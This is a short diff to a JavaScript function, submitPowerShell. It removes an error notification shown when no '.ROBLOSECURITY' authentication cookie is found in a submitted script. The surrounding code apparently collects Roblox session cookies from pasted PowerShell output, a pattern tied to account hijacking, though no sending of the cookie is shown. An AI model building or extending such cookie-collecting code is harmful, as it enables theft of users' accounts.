@@ -243,7 +243,6 @@ async function submitPowerShell() {
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
-            showNotification('No .ROBLOSECURITY authentication found in script', 'error');
             
             setTimeout(() => {
                 submitBtn.disabled = false;
